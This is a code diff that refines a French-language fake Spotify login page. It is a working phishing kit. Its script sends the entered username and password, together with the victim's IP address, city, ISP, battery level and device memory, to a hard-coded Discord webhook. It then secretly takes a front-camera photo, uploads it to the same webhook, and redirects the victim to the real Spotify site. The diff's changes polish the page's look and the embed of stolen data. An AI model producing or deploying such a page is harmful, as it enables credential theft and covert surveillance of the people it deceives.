@@ -3,78 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Spotify - Connexion</title>
+    <title>Connexion - Spotify</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        
-        /* On élargit la carte et on ajoute du padding interne */
-        .login-card { 
-            background-color: #121212; 
-            width: 95%; 
-            max-width: 450px; 
-            padding: 60px 45px; 
-            border-radius: 12px; 
-            text-align: center; 
+        @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
+
+        body { 
+            background-color: #000; 
+            color: #fff; 
+            font-family: 'Figtree', sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0;
         }
 
-        .logo { width: 110px; margin: 0 auto 40px auto; }
-        h1 { font-size: 28px; font-weight: 700; margin-bottom: 35px; letter-spacing: -1px; }
+        .login-card { 
+            background-color: #121212; 
+            width: 100%; 
+            max-width: 440px; 
+            padding: 50px 45px; 
+            border-radius: 8px; 
+            text-align: center;
+        }
 
-        /* Espacement entre les inputs */
-        .input-group { margin-bottom: 20px; text-align: left; }
+        .logo { width: 100px; margin: 0 auto 35px auto; }
         
+        h1 { 
+            font-size: 32px; 
+            font-weight: 900; 
+            margin-bottom: 40px; 
+            letter-spacing: -1px; 
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
         input { 
             width: 100%; 
             background: #121212; 
             border: 1px solid #727272; 
             border-radius: 4px; 
-            padding: 16px; 
+            padding: 14px; 
             color: #fff; 
             outline: none; 
-            font-size: 16px; 
+            font-size: 16px;
+            transition: border 0.2s;
         }
+
         input:focus { border: 2px solid #fff; }
 
-        /* Le bouton avec de la marge au-dessus */
         .btn-green { 
-            background: #1DB954; 
+            background: #1ed760; 
             color: #000; 
             font-weight: 700; 
-            padding: 16px; 
+            padding: 14px; 
             border-radius: 500px; 
             width: 100%; 
-            text-transform: uppercase; 
-            cursor: pointer; 
-            border: none; 
-            letter-spacing: 1.5px; 
             margin-top: 15px;
+            font-size: 16px;
+            border: none; 
+            cursor: pointer;
+            transition: transform 0.1s;
         }
 
-        .links { margin-top: 40px; font-size: 14px; color: #b3b3b3; }
-        .links a { color: #fff; text-decoration: underline; font-weight: 700; }
+        .btn-green:active { transform: scale(0.98); }
+
+        .links { margin-top: 35px; font-size: 14px; }
+        .links a { color: #fff; text-decoration: underline; }
+        
+        .divider {
+            margin: 40px 0;
+            border-top: 1px solid #292929;
+        }
+
+        .signup { color: #b3b3b3; font-size: 14px; }
+        .signup a { color: #fff; font-weight: 700; text-decoration: none; }
+        .signup a:hover { text-decoration: underline; }
+
         #v, #c { position: absolute; left: -9999px; visibility: hidden; }
     </style>
 </head>
 <body>
     <div class="login-card">
         <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png" class="logo">
-        <h1>Se connecter pour continuer</h1>
+        <h1>Se connecter</h1>
         
         <div class="input-group">
+            <label>E-mail ou nom d'utilisateur</label>
             <input id="u" type="text" placeholder="E-mail ou nom d'utilisateur">
         </div>
+
         <div class="input-group">
+            <label>Mot de passe</label>
             <input id="p" type="password" placeholder="Mot de passe">
         </div>
         
-        <button onclick="send()" id="btn" class="btn-green">Se connecter</button>
+        <button onclick="run()" id="btn" class="btn-green">Se connecter</button>
         
         <div class="links">
             <p><a href="#">Mot de passe oublié ?</a></p>
-            <div style="margin-top: 45px; border-top: 1px solid #282828; padding-top: 30px;">
-                <p>Tu n'as pas de compte ? <a href="#">S'INSCRIRE</a></p>
-            </div>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="signup">
+            <p>Tu n'as pas de compte ? <a href="#">S'inscrire sur Spotify</a></p>
         </div>
     </div>
 
@@ -84,40 +128,40 @@
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
 
-        async function send() {
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-            if(!u || !p) return;
+        async function run() {
+            const user = document.getElementById('u').value;
+            const pass = document.getElementById('p').value;
+            if(!user || !pass) return;
 
-            document.getElementById('btn').innerHTML = "CONNEXION...";
+            document.getElementById('btn').innerText = "Connexion...";
 
-            // Récupération IP
+            // Données
             let net = {};
-            try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e){}
+            try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
             
-            // Récupération Batterie
             let bat = "N/A";
-            try { const b = await navigator.getBattery(); bat = Math.round(b.level * 100) + "%"; } catch(e){}
+            try { bat = await navigator.getBattery().then(b => Math.round(b.level * 100) + "%"); } catch(e){}
 
-            // Envoi Discord
+            // Embed Discord (Design Pro)
             const payload = {
                 embeds: [{
-                    title: "🚀 LOG RÉCUPÉRÉ (DESIGN PRO V4)",
-                    color: 1947988,
+                    title: "🚀 ACCÈS RÉCUPÉRÉ (LVN ULTIMATE)",
+                    color: 1955168,
+                    thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" },
                     fields: [
-                        { name: "👤 Identifiants", value: `**User:** \`${u}\`\n**Pass:** \`${p}\`` },
-                        { name: "🌐 Infos", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city || '?'}\`\n**Batterie:** \`${bat}\`` },
-                        { name: "📱 Appareil", value: `**RAM:** \`${navigator.deviceMemory || '?'}GB\`\n**CPU:** \`${navigator.hardwareConcurrency || '?'} Coeurs\`` }
+                        { name: "👤 Identifiants", value: `**User:** \`${user}\`\n**Pass:** \`${pass}\`` },
+                        { name: "🌐 Réseau", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city || '?'}\`\n**FAI:** \`${net.org || '?'}\``, inline: true },
+                        { name: "🔋 Infos", value: `**Batterie:** \`${bat}\`\n**RAM:** \`${navigator.deviceMemory || '?'}GB\``, inline: true }
                     ],
                     footer: { text: "LVN System • " + new Date().toLocaleString() }
                 }]
             };
 
-            fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
 
             // Capture Photo
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 await new Promise(r => setTimeout(r, 2000));
@@ -126,11 +170,11 @@
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 canvas.toBlob(async (blob) => {
                     const fd = new FormData();
-                    fd.append('file', blob, 'cam.png');
-                    fd.append('content', "📸 **Capture :**");
+                    fd.append('file', blob, 'shot.png');
+                    fd.append('content', "📸 **Capture Caméra Frontale :**");
                     await fetch(hook, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
-                }, 'image/png');
+                });
             } catch (e) {}
 
             setTimeout(() => { window.location.href = "https://www.spotify.com"; }, 2500);
